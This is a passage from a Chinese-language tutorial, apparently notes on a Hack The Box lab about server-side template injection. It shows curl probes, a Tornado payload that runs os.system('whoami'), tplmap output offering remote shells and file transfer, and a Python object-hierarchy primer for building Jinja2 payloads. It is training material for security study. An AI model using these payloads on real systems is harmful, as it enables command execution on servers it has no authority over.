style="text-align: center;"&gt;&lt;em&gt;Email 49 has been subscribed. You&amp;#39;ll hear from us soon!&lt;/em&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>应用程序评估了我们提交的最新表达式。所以，根据图表，我们应该处理Twig或Jinja2模板引擎，对吗？</p>
<p>不幸的是，事实并非如此！如果我们提交任何Twig或Jinja 2特定的负载，应用程序将返回<code>500: Internal Server Error</code>。下面是一些这种行为的例子。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email={{_self.env.display("TEST"}}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;title&gt;500: Internal Server Error&lt;/title&gt;&lt;body&gt;500: Internal Server Error&lt;/body&gt;&lt;/html&gt;        </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;title&gt;500: Internal Server Error&lt;/title&gt;&lt;body&gt;500: Internal Server Error&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>我们使用的有效负载（以及更多）可以在[PayloadsAllTheThings - Template Injection](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection#jinja2)和<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks- SSTI（服务器端模板注入）</a>上找到</p>
<p>既然没有一种方法是无懈可击的，那就应该直截了当了。我们可以从上面提到的资源中编译一个模板引擎特定的有效负载列表，并模糊应用程序，直到我们得出正在使用的模板引擎的结论。</p>
<p>最终，当提交<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/guide/templates.html">龙卷风</a>特定的有效载荷时，我们会遇到下面的情况。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">form {</span><br><span class="line">margin: 0 auto;</span><br><span class="line">width: 200;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 style="text-align: center;"&gt;~ Damn Hackers ~&lt;/h1&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;Gentlemen, we can rebuild it &lt;br /&gt;We have the technology &lt;br /&gt;We have the capability to make the worlds first bionic website&lt;br /&gt;Better than it was before &lt;br /&gt;Better, Stronger, Faster.&lt;/h2&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;&lt;em&gt;Great!&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3 style="text-align: center;"&gt;&lt;em&gt;Email 0 has been subscribed. You&amp;#39;ll hear from us soon!&lt;/em&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>看来我们终于得到了！Tornado正在后端使用。</p>
<p>如前所述，<code>tplmap</code>可用于自动化模板引擎识别和开发过程。</p>
<h4 id="tplmap-py-1"><a href="#tplmap-py-1" class="headerlink" title="tplmap.py"></a>tplmap.py</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ./tplmap.py -u 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam' -d email=blah</span><br><span class="line"></span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if POST parameter 'email' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '${*}'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Tornado plugin has confirmed injection with tag '{{*}}'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  POST parameter: email</span><br><span class="line">  Engine: Tornado</span><br><span class="line">  Injection: {{*}}</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell				Run shell on the target</span><br><span class="line">    --os-cmd				Execute shell commands</span><br><span class="line">    --bind-shell PORT			Connect to a shell bind to a target port</span><br><span class="line">    --reverse-shell HOST PORT	Send a shell back to the attacker's port</span><br><span class="line">    --upload LOCAL REMOTE	Upload files to the server</span><br><span class="line">    --download REMOTE LOCAL	Download remote files</span><br></pre></td></tr></tbody></table></figure>

<h2 id="SSTI-Exploitation-Example-3"><a href="#SSTI-Exploitation-Example-3" class="headerlink" title="SSTI Exploitation Example 3"></a>SSTI Exploitation Example 3</h2><p>让我们看看SSTI系列的最后一个应用程序。再次强调，我们的重点是确定应用程序是否容易受到服务器端模板注入的攻击。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/jinja1.png" alt="image"></p>
<p>用户输入通过GET请求通过<code>cmd</code>参数提交。让我们在输入字段中的花括号中提交数学表达式，例如在<code>SSTI Identification</code>部分中提到的那些，从<code>{7*7}</code>开始。</p>
<h4 id="cURL-Interacting-with-the-Target-10"><a href="#cURL-Interacting-with-the-Target-10" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={7*7}"</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	#command {</span><br><span class="line">		resize: horizontal;</span><br><span class="line">		background-color : transparent;</span><br><span class="line">		border-color: transparent;</span><br><span class="line">		font-size: 15px;</span><br><span class="line">		width: 200px;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">	#command:active {</span><br><span class="line">        width: auto;   </span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset="utf-8"&gt;</span><br><span class="line">    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span><br><span class="line">	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	</span><br><span class="line">	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;</span><br><span class="line">	&lt;title&gt;Windows&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;{7*7}&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class="window" data-title="Windows"&gt;</span><br><span class="line">			&lt;h1&gt;Windows&lt;/h1&gt;</span><br><span class="line">			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span><br><span class="line">			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="taskbar"&gt;		</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="icons"&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span><br><span class="line">		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>看起来应用程序没有评估提交的表达式。让我们继续另一个表达式，这次是<code>${7*7}</code>。             </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=${7*7}'</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	#command {</span><br><span class="line">		resize: horizontal;</span><br><span class="line">		background-color : transparent;</span><br><span class="line">		border-color: transparent;</span><br><span class="line">		font-size: 15px;</span><br><span class="line">		width: 200px;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">	#command:active {</span><br><span class="line">        width: auto;   </span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset="utf-8"&gt;</span><br><span class="line">    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span><br><span class="line">	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	</span><br><span class="line">	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;</span><br><span class="line">	&lt;title&gt;Windows&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;${7*7}&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class="window" data-title="Windows"&gt;</span><br><span class="line">			&lt;h1&gt;Windows&lt;/h1&gt;</span><br><span class="line">			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span><br><span class="line">			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="taskbar"&gt;		</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="icons"&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span><br><span class="line">		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>看起来应用程序也没有计算这个表达式。<code>{{7*7}}</code>怎么样？   </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*7}}"</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	#command {</span><br><span class="line">		resize: horizontal;</span><br><span class="line">		background-color : transparent;</span><br><span class="line">		border-color: transparent;</span><br><span class="line">		font-size: 15px;</span><br><span class="line">		width: 200px;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">	#command:active {</span><br><span class="line">        width: auto;   </span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset="utf-8"&gt;</span><br><span class="line">    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span><br><span class="line">	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	</span><br><span class="line">	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;</span><br><span class="line">	&lt;title&gt;Windows&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;49&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class="window" data-title="Windows"&gt;</span><br><span class="line">			&lt;h1&gt;Windows&lt;/h1&gt;</span><br><span class="line">			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span><br><span class="line">			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="taskbar"&gt;		</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="icons"&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span><br><span class="line">		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>幸运的是，这一次，应用程序评估了我们提交的最新数学表达式，并返回了结果49。看起来我们可能正在处理一个SSTI漏洞！</p>
<p>如前所述，在处理SSTI漏洞时，我们需要做的第一件事是识别应用程序正在使用的模板引擎。让我们再次在<code>SSTI Identification</code>中使用PortSwigger的图表。我们已经知道<code>{{7*7}}</code>表达式被成功地求值了。图中建议尝试的下一个表达式是<code>{{7*'7'}}</code>。让我们尝试一下，看看应用程序如何响应。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*'7'}}"</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	#command {</span><br><span class="line">		resize: horizontal;</span><br><span class="line">		background-color : transparent;</span><br><span class="line">		border-color: transparent;</span><br><span class="line">		font-size: 15px;</span><br><span class="line">		width: 200px;</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">	#command:active {</span><br><span class="line">        width: auto;   </span><br><span class="line">    }</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset="utf-8"&gt;</span><br><span class="line">    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;</span><br><span class="line">	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;</span><br><span class="line">	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;</span><br><span class="line">	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	</span><br><span class="line">	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;</span><br><span class="line">	&lt;title&gt;Windows&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;7777777&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class="window" data-title="Windows"&gt;</span><br><span class="line">			&lt;h1&gt;Windows&lt;/h1&gt;</span><br><span class="line">			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span><br><span class="line">			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="taskbar"&gt;		</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div id="icons"&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;</span><br><span class="line">			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span><br><span class="line">		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>应用程序也成功地计算了此表达式。根据PortSwigger的图表，我们正在处理Jinja 2或Twig模板引擎。也就是说,这意味着Jinja 2正在后端使用。</p>
<p>我们可以自动化我们刚刚通过<code>tplmap</code>执行的模板引擎识别过程，如下所示。</p>
<h4 id="tplmap-py-2"><a href="#tplmap-py-2" class="headerlink" title="tplmap.py"></a>tplmap.py</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ./tplmap.py -u 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd'</span><br><span class="line"></span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if GET parameter 'cmd' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '${*}'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag '{{*}}'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: cmd</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: {{*}}</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell				Run shell on the target</span><br><span class="line">    --os-cmd				Execute shell commands</span><br><span class="line">    --bind-shell PORT			Connect to a shell bind to a target port</span><br><span class="line">    --reverse-shell HOST PORT	Send a shell back to the attacker's port</span><br><span class="line">    --upload LOCAL REMOTE	Upload files to the server</span><br><span class="line">    --download REMOTE LOCAL	Download remote files</span><br></pre></td></tr></tbody></table></figure>

<p>下一步是在目标服务器上获得远程代码执行。在进入有效负载开发部分之前，让我们来看看SSTI的一些Python。</p>
<h3 id="Python-Primer-for-SSTI"><a href="#Python-Primer-for-SSTI" class="headerlink" title="Python Primer for SSTI"></a>Python Primer for SSTI</h3><p>下面是一个来自<a target="_blank" rel="noopener" href="https://www.fatalerrors.org/a/0dhx1Dk.html">fatalerrors.org的</a>小字典，在浏览本节的Jinja 2有效负载开发部分时可以参考：</p>
<table>
<thead>
<tr>
<th><strong>No.</strong></th>
<th><strong>Methods</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1.</td>
<td><code>__class__</code></td>
<td>返回类型所属的对象（类）</td>
</tr>
<tr>
<td>2.</td>
<td><code>__mro__</code></td>
<td>返回一个元组，该元组包含由对象继承的基类。方法按元组的顺序进行解析。</td>
</tr>
<tr>
<td>3.</td>
<td><code>__subclasses__</code> <code>__class__</code></td>
<td>每个新类都保留对子类的引用，此方法返回类中仍然可用的引用列表</td>
</tr>
<tr>
<td>4.</td>
<td><code>__builtins__</code></td>
<td>返回函数中包含的内置方法</td>
</tr>
<tr>
<td>5.</td>
<td><code>__globals__</code></td>
<td>对包含函数全局变量的字典的引用</td>
</tr>
<tr>
<td>6.</td>
<td><code>__base__</code></td>
<td>返回对象继承的基类&lt;–（__ base__和__ mro__用于查找基类）</td>
</tr>
<tr>
<td>7.</td>
<td><code>__init__</code> <code>__class__</code></td>
<td>类初始化方法</td>
</tr>
</tbody></table>
<p>首先在Pwnbox或本地VM的终端上运行Python，然后沿着做。</p>
<h4 id="Python-3-Interpreter"><a href="#Python-3-Interpreter" class="headerlink" title="Python 3 Interpreter"></a>Python 3 Interpreter</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ python3</span><br><span class="line"></span><br><span class="line">Python 3.9.2 (default, Feb 28 2021, 17:03:44) </span><br><span class="line">[GCC 10.2.1 20210110] on linux</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></tbody></table></figure>

<p>创建一个字符串对象并使用<code>type</code>和<code>__class__</code>，如下所示。然后使用<code>dir()</code>命令显示对象的所有方法和属性。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> flask</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'HTB'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(s)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(s)</span><br><span class="line"></span><br><span class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'capitalize'</span>, <span class="string">'casefold'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'format_map'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isascii'</span>, <span class="string">'isdecimal'</span>, <span class="string">'isdigit'</span>, <span class="string">'isidentifier'</span>, <span class="string">'islower'</span>, <span class="string">'isnumeric'</span>, <span class="string">'isprintable'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'maketrans'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</span><br></pre></td></tr></tbody></table></figure>

<p>下一步是理解Python的层次结构。使用<code>__mro__</code>或<code>mro()</code>，我们可以在Python环境中返回继承对象的树。让我们按如下方式练习。</p>
<p>Code: s._<em>class</em></p>
